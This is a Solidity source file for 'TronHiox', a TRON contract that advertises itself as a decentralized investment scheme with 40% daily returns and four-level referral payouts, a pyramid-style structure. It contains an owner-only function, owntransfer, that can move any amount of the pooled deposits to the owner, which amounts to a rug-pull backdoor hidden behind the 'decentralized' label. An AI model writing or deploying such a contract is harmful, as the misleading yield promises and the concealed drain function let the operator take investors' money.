//SourceUnit: hioxfinal_2.sol

/************************************/
/*									*/      
/* HIOX.IO							*/
/* DECENTRALIZED SMART CONTRACT		*/
/* VERSION 1.2						*/
/* 40% 24 HOURS ROI					*/
/* 25% Withdraw Allowed Contract	*/
/* 3TRX MARKETTING FEE ON WITHDRAW	*/
/* 									*/
/* INVESTMENT						*/
/* 100 TRX MINIMUM					*/
/* UNLIMITED TRX MAXIMUM			*/
/* 7 TRX DEVELOPMENT FEE			*/
/* 									*/
/* Peer to Peer Instant Transfer	*/
/* 10% Direct Referral				*/
/* 5% Cashback on Reinvest			*/
/* Level Bonus Only on Reinvest		*/
/* 1st Level = 7%					*/
/* 2nd Level = 3%					*/
/* 3rd Level = 2%					*/
/* 4th Level = 1%					*/
/*									*/
/************************************/

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    
    struct Investor {
        address addr;
        uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 reinvestWallet;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefAmount;
        uint256 level2RefAmount;
        uint256 level3RefAmount;
        uint256 level4RefAmount;        
        uint256 investmentAmountTotal;
        uint256 withdrawAmountTotal;
        uint256 referrelAmountTotal;
    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TronHiox is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 7e6; 
    uint256 public constant MARKETING_RATE = 3e6;
    uint256 public constant REFERENCE_RATE = 130;
    uint256 public constant DIRECT_RATE = 100;
    uint256 public constant CASHBACK_RATE = 50;
    uint256 public constant REFERENCE_LEVEL1_RATE = 70;
    uint256 public constant REFERENCE_LEVEL2_RATE = 30;
    uint256 public constant REFERENCE_LEVEL3_RATE = 20;
    uint256 public constant REFERENCE_LEVEL4_RATE = 10;
    uint256 public constant MINIMUM = 100e6;
    uint256 public constant REFERRER_CODE = 1000;
    uint256 public constant PLAN_INTEREST = 400;
    uint256 public constant PLAN_TERM = 300 hours;
    uint256 public constant LAST_PLAN_TERM = 180 hours;
    uint256 public constant CONTRACT_LIMIT = 750;

    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalReinvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;

    address payable private ref1addr;
    address payable private ref2addr;
    address payable private ref3addr;
    address payable private ref4addr;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.reinvestWallet,
        investor.referrer,
        investor.level1RefAmount,
        investor.level2RefAmount,
        investor.level3RefAmount,
        investor.level4RefAmount,
        investor.planCount,
        investor.checkpoint,
        investor.investmentAmountTotal,
        newDividends
        );
    }

    function getInvestorInfoByUID2(uint256 _uid) public view returns (uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.withdrawAmountTotal
        );
    }


    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].checkpoint = block.timestamp;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        
        uint256 uid = address2UID[_addr];

        uint8 newusr=0;
        if (uid == 0) {
            newusr=1;
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
           //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount.sub(DEVELOPER_RATE);
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        investor.investmentAmountTotal = investor.investmentAmountTotal.add((_amount.sub(DEVELOPER_RATE)));

        if (newusr ==0){
            _calculateReferrerReward(_amount, investor.referrer);
        }else{
            _calculateReferrerReward_first(_amount, investor.referrer);
        }

        totalInvestments_ = totalInvestments_.add(_amount.sub(DEVELOPER_RATE));

        uint256 developerPercentage = (DEVELOPER_RATE);
        developerAccount_.transfer(developerPercentage);
        return true;
    }

    
    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function owntransfer(uint256 _amt) public onlyOwner returns(bool transfterBool){
        require(msg.sender == owner,'Only owner perform this action');
        owner.call.value(_amt)("");
        return true;

    }
    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");

        require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Once per day only allowed");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;

            if( i==(uid2Investor[uid].planCount-1)){
                uint256 max_allowed_time =uid2Investor[uid].plans[i].investmentDate.add(LAST_PLAN_TERM);
                if(block.timestamp>max_allowed_time){
                    withdrawalDate = max_allowed_time;
                }
            }


            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }


        if(withdrawalAmount>0){
            uint256 currentBalance = getBalance();
            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }
            require( currentBalance.sub(withdrawalAmount)  >= contract_balance.mul(CONTRACT_LIMIT).div(1000), "75% contract balance limit");

            uid2Investor[uid].withdrawAmountTotal = uid2Investor[uid].withdrawAmountTotal.add(withdrawalAmount);

            msg.sender.transfer(withdrawalAmount.sub(MARKETING_RATE));
            uint256 marketingPercentage = (MARKETING_RATE);
            marketingAccount_.transfer(marketingPercentage);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {
        uint256 _investment2 = _investment.sub(DEVELOPER_RATE);

        uint256 _allReferrerAmount = (_investment2.mul(REFERENCE_RATE)).div(1000);

		uint256 _cashbackAmount = (_investment2.mul(CASHBACK_RATE)).div(1000);
		msg.sender.transfer(_cashbackAmount);


        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _refAmount = 0;


            if (_ref1 != 0) {
                _refAmount = (_investment2.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].level1RefAmount = _refAmount.add(uid2Investor[_ref1].level1RefAmount);
                
				Objects.Investor storage investor = uid2Investor[_ref1];
				ref1addr = address(uint160(investor.addr));
                ref1addr.transfer(_refAmount);
				
            }

            if (_ref2 != 0) {
                _refAmount = (_investment2.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].level2RefAmount = _refAmount.add(uid2Investor[_ref2].level2RefAmount);
                
				Objects.Investor storage investor = uid2Investor[_ref2];
				ref2addr = address(uint160(investor.addr));
                ref2addr.transfer(_refAmount);
				
            }

            if (_ref3 != 0) {
                _refAmount = (_investment2.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].level3RefAmount = _refAmount.add(uid2Investor[_ref3].level3RefAmount);

				Objects.Investor storage investor = uid2Investor[_ref3];
				ref3addr = address(uint160(investor.addr));
                ref3addr.transfer(_refAmount);

            }

            if (_ref4 != 0) {
                _refAmount = (_investment2.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref4].level4RefAmount = _refAmount.add(uid2Investor[_ref4].level4RefAmount);

				Objects.Investor storage investor = uid2Investor[_ref4];
				ref4addr = address(uint160(investor.addr));
                ref4addr.transfer(_refAmount);
           }
        }

    }

    function _calculateReferrerReward_first(uint256 _investment, uint256 _referrerCode) private {

        uint256 _investment2 = _investment.sub(DEVELOPER_RATE);

        uint256 _allReferrerAmount = (_investment2.mul(DIRECT_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _refAmount = 0;
            
            if (_ref1 != 0) {
                _refAmount = (_investment2.mul(DIRECT_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].referrerEarnings = _refAmount.add(uid2Investor[_ref1].referrerEarnings);
                uid2Investor[_ref1].referrelAmountTotal = _refAmount.add(uid2Investor[_ref1].referrelAmountTotal);
				
				Objects.Investor storage investor = uid2Investor[_ref1];
				ref1addr = address(uint160(investor.addr));
                ref1addr.transfer(_refAmount);
            }
        }

    }

    function updateBalance() public {
        require(block.timestamp > contract_checkpoint + 1 days , "Only once a day");
        contract_checkpoint = block.timestamp;
        contract_balance = getBalance();
    }

    function getHour() public view returns (uint8){
        return uint8((block.timestamp / 60 / 60) % 24);
    }

    function withdrawAllowance() public view returns(bool){
        uint8 hour = getHour();
        if(hour >= 0 && hour <= 3){
            return false;
        }
        else{
            return true;
        }
    }

}